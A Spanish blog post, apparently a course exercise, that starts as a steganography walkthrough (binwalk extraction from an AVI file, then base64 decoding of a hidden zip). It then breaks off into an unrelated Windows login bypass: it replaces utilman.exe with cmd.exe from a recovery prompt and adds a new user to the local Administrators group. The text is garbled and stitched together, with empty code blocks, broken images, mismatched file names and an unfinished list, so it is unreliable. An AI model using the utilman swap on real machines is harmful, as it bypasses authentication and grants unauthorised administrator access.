---
title: MTD - Esteganografía
published: true
categories: [Linux]
tags: [eJPT, eWPT, eCPPTv2, OSCP, Dificil]
---


¡Hola! 
Vamos a realizar un ejercicio de esteganografía. En el tendremos que descifrar un contenido de una imagen, en este caso un vídeo.

## HERRAMIENTAS UTILIZADAS
* BINWALK
* CEWL
* JONTHERIPPER
* ESOTERIC DESENCRYPT



* * *

## PRIMEROS PASOS
En primer lugar visualizaremos el vídeo que vamos a analizar en este caso el nombre de nuestro archivo será `350911.avi`.
Como podemos observar el vídeo a simple vista no aparenta tener nada, pero nosotros sabemos que contiene contenido oculto detrás.

<img src="/assets/HTB/Esteganografia/preview-video.png">

*Preview del vídeo que podemos encontrar en el archivo .mp4*

En primer lugar usaremos la herramienta de binwalk, para descifrar contenido dentro de una imagen por ello usaremos el siguiente comando.

```bash
☁  Escritorio  binwalk 350911.avi -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
26013116      0x18CEDBC       Zip archive data, at least v2.0 to extract, compressed size: 613, uncompressed size: 811, name: bandera64.txt
26013883      0x18CF0BB       End of Zip archive, footer length: 22
```

Los que nos extraerá un archivo en nuestro `Escritorio` dónde podremos encontrar un archivo llamado `bandera.txt`, viendo que el contenido del vídeo trae algo encriptado.

```bash
☁  Escritorio  ls
350911.avi  _350911.avi-0.extracted  _350911.avi.extracted  baShMarin.github.io
☁  Escritorio  cd _350911.avi.extracted 

☁  _350911.avi.extracted  ls
18CEDBC.zip  bandera64.txt

☁  _350911.avi.extracted  cat bandera64.txt 
UEsDBAoACQBjALpE5UyE1fPolAEAAHgBAAALAAsAYmFuZGVyYS5wbmcBmQcAAQBBRQMAAPKu8K6x
c7GJh/VmKva+f8JqD7Pe3X95ttenp+LwVVKiTrs1N450IIK7cjKsIYwqYBWiSwcClH2S51vh+L6/
xnICJFdIYuqD+sB282j0guUmoXbdIwU3dMtkYeUs/tOm7yd4TxHMfEQ2wM+i64R/iuhx9xvvh5PV
jnyPiKnjKPTQf9tH1XflKezQ8lHDAFPeEWZSMlRBaOwVWLywkiopyEYSuJGzJchCoRtiMX3fmfJX
8bD3SozBFIOPMjje/3/Xn6tVdmaaAVpAt8+iXu05VwXmmg8Ub7isi2KJBljiGMTQ+knFndW3gCEr
V3pk1OfNOGWAI09l5QXe6I+UKJZ5p9bpLi0fBbTHJCFcFu5y/IJHr9Vr5rzi6vpPU7p0ZtNJyYoK
EUB18DsmONtxc+xuqloJtzhRUQ5ZHRWumnfMk9Cw1tYT/KHa4gWh/GOVHLEAkizskRobAfanZ0OY
TfmYtjl/60UaL/sFkDYH4+uNt9MKLLiLR4WomoTq2Qi4o+EyzLDO0drgZXjsd1aN9s3EYkNY+Ug6
UEsHCITV8+iUAQAAeAEAAFBLAQIfAAoACQBjALpE5UyE1fPolAEAAHgBAAALAC8AAAAAAAAAIAAA
AAAAAABiYW5kZXJhLnBuZwoAIAAAAAAAAQAYAABwYYR+FNQBD0sSrJY51AHbTw9ChznUAQGZBwAB
AEFFAwAAUEsFBgAAAAABAAEAaAAAANgBAAAAAA==
```
Hemos encontrado una codificación que parece estar en base64 en `bandera.txt`.

<img src="/assets/HTB/Android">

* *Capturas realizadas desde mi máquina `Kali Linux`*

* * * 

## PRIMERA FLAG
Hemos conseguido obtener una primera flag hacia nuestro objetivo, ya que sabemos que el archivo contiene algo detrás de un simple vídeo en formato `.AVI`
Lo que parece ser una codificación en `base64`, vamos a intentar descodificarla con el siguiente comando.

```bash
☁  _350911.avi.extracted  cat bandera64.txt | base64 -d
PK
 c�D�L����x

                  bandera.png�AE��s����f*���j���y�ק���UR�N�57�t ��r2�!�*`�K�}��[�����r$WHb���v�h��&�v�#7t�da�,�Ӧ�'xO�|D6�Ϣ���q�Վ|����(���G�w�)���Q�S�fR2TAh�X���*)�F���%�B�1}ߙ�W��J����28��ן�Uvf�Z@�Ϣ^�9W�o���b�X����Iŝշ�!+Wzd���8e�#Oe��菔(�y���.-��$!\�r��G��k����OS�tf�IɊ
@u�;&8�qs�n�Z �8QQY��w̓а��������c���,���gC�M���9�E�/��6�덷�
,��G��������2̰����ex�wV����bCX�H:P����xPK
 c�D�L����x
                  / bandera.png
 pa�~�K��9��OB�9��AEPKh�%  
```
Seguidamente podemos sacar este fichero hacia el escritorio para ver un poco mejor lo que contiene el archivo.

```bash
☁  _350911.avi.extracted  cat bandera64.txt | base64 -d > fichero
☁  _350911.avi.extracted  ls
18CEDBC.zip  bandera64.txt  fichero
```

Dentro del archivo podremos encontrar un archivo `.png` con una contraseña. 

<img src="/assets/HTB/Android/">


En el vídeo podemos observar que nos hace mención a lo que parece o un videojuego o una serie de dibujos animados llamada `MonkeyIsland`, por lo tanto podemos buscar información en páginas a ver si encontrasemos una documentación o algun foro para crearnos nuestro propio diccionario con palabras relacionadas con el videojuego para intentar desencriptar el archivo en `base64`: `bandera.txt`.

Para ello haremos uso de `CEWL`

### CEWL
`CEWL` es una herramienta que nos ayuda con la creación de diccionarios, donde le podemos pasar una URL y en base al contenido que tiene crearnos un diccionario de palabras claves.


```bash 

```



```bash
DISKPART>
```

<img src="/assets/HTB/Android/">

* 

```bash
DISKPART> 
```



```bash
X:> c:
```


```bash
C:> cd System32
```

```
C:\Windows\System32> move utilman.exe utilman.exe.bak
```

```bash
C:\Windows\System32> copy cmd.exe utilman.exe
```

Seguido de ello escribiremos el comando 

```bash
C:\Windows\System32> Wpeutil reboot
```


<img src="/assets/HTB/Android/">



```bash
C:\Windows\System32> net user "Nombre de usuario que quieras" /add
```

* 

```bash
C:\Windows\System32> net localgroup
```

```bash
C:
```
* 

`net localgroup Administradores Marin /add`


# DENTRO DE NUESTRO SISTEMA OPERATIVO


1. 
2. 
3. 
4. c





* * *

*__Esto es un trabajo realizado para MasterD con fines didácticos, no está enseñado para otro de sus usos.__*
